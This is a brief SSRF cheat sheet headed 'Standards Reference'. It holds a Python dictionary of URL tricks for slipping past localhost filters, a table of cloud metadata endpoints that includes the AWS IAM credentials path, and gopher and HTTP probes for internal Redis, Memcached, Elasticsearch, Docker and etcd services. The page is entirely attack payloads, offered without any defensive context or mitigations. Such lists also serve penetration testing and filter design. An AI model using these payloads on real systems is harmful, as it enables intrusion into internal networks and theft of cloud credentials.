# Standards Reference

## SSRF Bypass Techniques

### URL Parsing Inconsistencies
```python
bypass_techniques = {
    'redirect': 'http://localhost/redirect?url=http://169.254.169.254/',
    'dns_rebind': 'http://7f000001.127.0.0.1.nip.io/',
    'decimal_ip': 'http://2130706433/',  # 127.0.0.1
    'hex_ip': 'http://0x7f000001/',
    'octal_ip': 'http://0177.0.0.1/',
    'ipv6_localhost': 'http://[::1]:80/',
    'ipv6_mapped_ipv4': 'http://[::ffff:127.0.0.1]/',
    'unicode_bypass': 'http://127。0。0。1/',
    'double_encode': 'http://127.0.0.1%2523/',
    'at_bypass': 'http://foo@127.0.0.1:80/',
}
```

### Cloud Metadata Endpoints
| Provider | Endpoint | Description |
|----------|----------|-------------|
| AWS | http://169.254.169.254/latest/meta-data/ | Instance metadata |
| AWS | http://169.254.169.254/latest/meta-data/iam/security-credentials/ | IAM credentials |
| Azure | http://169.254.169.254/metadata/instance?api-version=2021-02-01 | Instance metadata |
| GCP | http://metadata.google.internal/computeMetadata/v1/ | Instance metadata |
| DigitalOcean | http://169.254.169.254/metadata/v1/ | Droplet metadata |

## Internal Service Probing
- Redis: `gopher://internal.redis:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a`
- Memcached: `gopher://internal.memcached:11211/_stats`
- Elasticsearch: `http://internal.es:9200/_cat/indices`
- Docker API: `http://localhost:2375/containers/json`
- Kubernetes ETCD: `http://localhost:2379/version`
